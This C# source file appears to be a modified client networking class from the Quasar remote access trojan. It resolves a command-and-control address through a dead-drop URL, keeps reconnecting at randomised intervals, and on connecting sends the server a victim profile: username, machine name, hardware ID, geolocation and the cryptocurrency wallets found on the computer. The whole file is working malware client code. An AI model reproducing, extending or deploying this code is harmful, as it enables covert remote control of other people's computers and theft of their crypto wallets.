using Quasar.Client.Config;
using Quasar.Client.Helper;
using Quasar.Client.IO;
using Quasar.Client.IpGeoLocation;
using Quasar.Client.User;
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Messages.other;
using Quasar.Common.Utilities;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Threading;



namespace Quasar.Client.Networking
{
    public class QuasarClient : Client, IDisposable
    {
        /// <summary>
        /// Used to keep track if the client has been identified by the server.
        /// </summary>
        private bool _identified;

        /// <summary>
        /// The hosts manager which contains the available hosts to connect to.
        /// </summary>
        private readonly HostsManager _hosts;

        /// <summary>
        /// Random number generator to slightly randomize the reconnection delay.
        /// </summary>
        private readonly SafeRandom _random;

        /// <summary>
        /// Create a <see cref="_token"/> and signals cancellation.
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// The token to check for cancellation.
        /// </summary>
        private readonly CancellationToken _token;

        /// <summary>
        /// Initializes a new instance of the <see cref="QuasarClient"/> class.
        /// </summary>
        /// <param name="hostsManager">The hosts manager which contains the available hosts to connect to.</param>
        /// <param name="serverCertificate">The server certificate.</param>
        public QuasarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            this._hosts = hostsManager;
            this._random = new SafeRandom();
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
            this._tokenSource = new CancellationTokenSource();
            this._token = _tokenSource.Token;
        }

        /// <summary>
        /// Connection loop used to reconnect and keep the connection open.
        /// </summary>





public void ConnectLoop()
    {
        Random random = new Random();

        while (!_token.IsCancellationRequested)
        {
            if (!Connected)
            {
                Host host = null;
                string hostString = Settings.HOSTS;

                if (!string.IsNullOrEmpty(hostString))
                {
                    host = ResolveHost(hostString);
                }

                if (host == null)
                {
                    host = _hosts.GetNextHost();
                }

                try
                {
                    base.Connect(host.IpAddress, host.Port);
                }
                catch (Exception)
                {
                }
            }

            while (Connected)
            {
                try
                {
                    _token.WaitHandle.WaitOne(1000);
                }
                catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
                {
                    Disconnect();
                    return;
                }
            }

            if (_token.IsCancellationRequested)
            {
                Disconnect();
                return;
            }

            int delay = Settings.RECONNECTDELAY + random.Next(250, 750);
            Thread.Sleep(delay);
        }
    }

    private Host ResolveHost(string hostString)
    {
        if (Uri.TryCreate(hostString, UriKind.Absolute, out Uri uri))
        {
            try
            {
                WebRequest request = WebRequest.Create(uri);
                request.Timeout = 10000;
                using (WebResponse response = request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    string content = reader.ReadToEnd().Trim();

                    if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
                    {
                        return ResolveHost(content);
                    }

                    string[] parts = content.Split(':');
                    if (parts.Length >= 2 &&
                        IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
                        ushort.TryParse(parts[1].Trim(), out ushort port))
                    {
                        return new Host { IpAddress = ip, Port = port };
                    }
                }
            }
            catch (Exception)
            {
            }
        }
        else
        {
            string[] parts = hostString.Split(':');
            if (parts.Length >= 2 &&
                IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
                ushort.TryParse(parts[1].Trim(), out ushort port))
            {
                return new Host { IpAddress = ip, Port = port };
            }
        }
        return null;
    }
    private Host ResolveHost(string hostString, string logFile)
    {
        if (Uri.TryCreate(hostString, UriKind.Absolute, out Uri uri))
        {
            try
            {
                WebRequest request = WebRequest.Create(uri);
                request.Timeout = 10000;
                using (WebResponse response = request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    string content = reader.ReadToEnd().Trim();
                    File.AppendAllText(logFile, $"{DateTime.Now}: Fetched from URI: '{content}'\n");

                    if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
                    {
                        return ResolveHost(content, logFile); // Recursive fetch if content is a URL
                    }

                    string[] parts = content.Split(':');
                    if (parts.Length >= 2 &&
                        IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
                        ushort.TryParse(parts[1].Trim(), out ushort port))
                    {
                        File.AppendAllText(logFile, $"{DateTime.Now}: Parsed IP: {ip}, Port: {port}\n");
                        return new Host { IpAddress = ip, Port = port };
                    }
                    else
                    {
                        File.AppendAllText(logFile, $"{DateTime.Now}: Failed to parse URI response: '{content}'\n");
                    }
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText(logFile, $"{DateTime.Now}: URI fetch error: {ex.Message}\n");
            }
        }
        else
        {
            string[] parts = hostString.Split(':');
            if (parts.Length >= 2 &&
                IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
                ushort.TryParse(parts[1].Trim(), out ushort port))
            {
                File.AppendAllText(logFile, $"{DateTime.Now}: Parsed direct IP: {ip}, Port: {port}\n");
                return new Host { IpAddress = ip, Port = port };
            }
            else
            {
                File.AppendAllText(logFile, $"{DateTime.Now}: Invalid hostString format: '{hostString}'\n");
            }
        }
        return null;
    }




    private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            if (!_identified)
            {
                if (message.GetType() == typeof(ClientIdentificationResult))
                {
                    var reply = (ClientIdentificationResult) message;
                    _identified = reply.Result;
                }
                return;
            }

            MessageHandler.Process(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            _identified = false; // always reset identification

            if (connected)
            {
                // send client identification once connected

                var geoInfo = GeoInformationFactory.GetGeoInformation();
                var userAccount = new UserAccount();

                client.Send(new ClientIdentification
                {
                    Version = Settings.VERSION,
                    OperatingSystem = PlatformHelper.FullName,
                    AccountType = userAccount.Type.ToString(),
                    Country = geoInfo.Country,
                    CountryCode = geoInfo.CountryCode,
                    ImageIndex = geoInfo.ImageIndex,
                    Id = HardwareDevices.HardwareId,
                    Username = userAccount.UserName,
                    PcName = SystemHelper.GetPcName(),
                    Tag = Settings.TAG,
                    EncryptionKey = Settings.ENCRYPTIONKEY,
                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
                    Wallets = WalletFinder.WalletFinder.GetFoundWallets()
                });
            }
        }

        /// <summary>
        /// Stops the connection loop and disconnects the connection.
        /// </summary>
        public void Exit()
        {
            _tokenSource.Cancel();
            Disconnect();
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this activity detection service.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _tokenSource.Cancel();
                _tokenSource.Dispose();
            }
        }
    }
}
